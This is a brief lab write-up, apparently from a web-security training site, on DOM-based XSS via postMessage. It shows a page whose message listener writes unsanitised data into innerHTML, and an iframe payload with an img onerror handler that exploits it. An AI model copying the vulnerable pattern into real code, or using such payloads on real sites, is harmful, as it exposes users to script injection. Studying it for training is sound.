# 1 - XSS Web Messages

### Notes

The page contains a JavaScript snippet that adds an event listener for web messages with a callback that sets the innerHTML of the `#ads` div to the message's data.

```html
<!-- Ads to be inserted here -->
<div id='ads'>
</div>
<script>
    window.addEventListener('message', function(e) {
        document.getElementById('ads').innerHTML = e.data;
    })
</script>
```

The following iframe will create a message onload that will ultimately result in the img element being set as the innerHTML of the `#ads` div. As the img src is set to "1", it will error on load and execute the `print()` method.

```html
<iframe 
  src="//0a3d00b6048387a3c0315ae6004f001e.web-security-academy.net"
  onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')"
></iframe>
```
